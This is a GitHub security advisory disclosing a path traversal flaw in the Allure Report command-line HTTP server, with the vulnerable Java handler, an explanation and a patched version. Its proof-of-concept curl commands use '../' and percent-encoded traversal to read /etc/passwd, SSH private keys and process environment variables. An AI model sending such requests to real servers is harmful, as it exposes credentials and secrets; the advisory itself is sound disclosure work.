# [M] Allure Report: Path Traversal in HTTP Server Allows Arbitrary File Read

## Summary
Severity: Medium
Advisory: GHSA-82cg-3hv7-74gc
CVE: CVE-2026-55846
CWE: CWE-22
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-82cg-3hv7-74gc
Type: github-advisory

## Affected
- Maven: `io.qameta.allure:allure-commandline` — affected >=0 <2.39.0

## Details
## Summary

The built-in HTTP server started by `allure serve` and `allure open` is vulnerable to path traversal. The server resolves request URI paths directly against the report directory without normalizing or validating that the resolved path stays within the report directory. An attacker who can reach the server can read any file accessible to the Allure process by sending a request containing `../` sequences.

## Details

When `allure serve` or `allure open` is executed, `Commands.setUpServer()` creates an HTTP server with a handler that serves files from the report directory:

**`allure-commandline/src/main/java/io/qameta/allure/Commands.java:325-339`**
```java
protected HttpServer setUpServer(final String host, final int port, final Path reportDirectory) throws IOException {
    final HttpServer server = HttpServer
            .create(new InetSocketAddress(Objects.isNull(host) ? "localhost" : host, port), 0);

    server.createContext("/", exchange -> {
        final Path resolve = reportDirectory.resolve("." + exchange.getRequestURI().getPath());  // line 330
        if (Files.isDirectory(resolve)) {
            serveFile(exchange, resolve.resolve("index.html"));
        } else {
            serveFile(exchange, resolve);
        }
    });

    return server;
}
```

On line 330, the handler constructs a file path by concatenating `"."` with the raw request URI path and resolving it against `reportDirectory`. For a request to `/../../../etc/passwd`:

1. `exchange.getRequestURI().getPath()` returns `"/../../../etc/passwd"`
2. String concatenation produces `"./../../../etc/passwd"`
3. `reportDirectory.resolve("./../../../etc/passwd")` resolves to e.g. `/tmp/allure-report/./../../../etc/passwd`
4. The OS resolves this to `/etc/passwd`

There is no call to `.normalize()` followed by a `.startsWith(reportDirectory)` containment check. The `serveFile()` method (line 341) reads and returns any regular file without further validation.

Additionally, `URI.getPath()` returns the percent-decoded path, so `%2e%2e` is decoded to `..`, enabling traversal via `/%2e%2e/%2e%2e/etc/passwd` which bypasses clients that normalize `..` in raw form.

The server defaults to binding on `localhost` (line 327), which limits remote exploitation. However, the `--host` option allows users to bind to any interface (e.g., `--host 0.0.0.0`), which is commonly used in CI/CD and containerized environments. Even when bound to localhost, the vulnerability is exploitable by:
- Other local users on shared/multi-tenant systems
- DNS rebinding attacks from malicious web pages visited by the user
- Adjacent containers in CI/CD environments that share a network namespace

## PoC

**Step 1:** Start the Allure server (simulating a typical CI/CD scenario with network binding):
```bash
allure serve ./test-results --host 0.0.0.0 --port 9090
```

**Step 2:** Read `/etc/passwd` via path traversal:
```bash
curl --path-as-is 'http://localhost:9090/../../../etc/passwd'
```

**Step 3:** Alternative using percent-encoded traversal (works even with clients that normalize `..`):
```bash
curl 'http://localhost:9090/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

**Step 4:** Read sensitive application files (e.g., environment variables, SSH keys):
```bash
curl --path-as-is 'http://localhost:9090/../../../home/user/.ssh/id_rsa'
curl --path-as-is 'http://localhost:9090/../../../proc/self/environ'
```

Each command returns the full contents of the requested file if readable by the Allure process.

## Impact

An attacker who can reach the Allure HTTP server can read any file on the system that the Allure process has permissions to access. This includes:

- **System credentials:** `/etc/shadow` (if running as root), SSH private keys, cloud provider credentials
- **Application secrets:** Environment variables via `/proc/self/environ`, configuration files, API keys
- **Source code and data:** Any file on the filesystem accessible to the running user

In CI/CD environments where Allure is commonly used, this could expose build secrets, deployment credentials, and other sensitive CI/CD artifacts. The lack of authentication means any client that can reach the server's port can exploit this vulnerability.

## Recommended Fix

Normalize the resolved path and verify it remains within the report directory before serving:

```java
server.createContext("/", exchange -> {
    final Path resolve = reportDirectory.resolve("." + exchange.getRequestURI().getPath()).normalize();
    if (!resolve.startsWith(reportDirectory.normalize())) {
        exchange.sendResponseHeaders(403, 0);
        exchange.getResponseBody().close();
        return;
    }
    if (Files.isDirectory(resolve)) {
        serveFile(exchange, resolve.resolve("index.html"));
    } else {
        serveFile(exchange, resolve);
    }
});
```

The `.normalize()` call collapses `..` sequences, and the `.startsWith()` check ensures the resolved path is still within the report directory. Requests attempting traversal receive a 403 Forbidden response.

## References
- https://github.com/allure-framework/allure2/security/advisories/GHSA-82cg-3hv7-74gc
- https://github.com/allure-framework/allure2
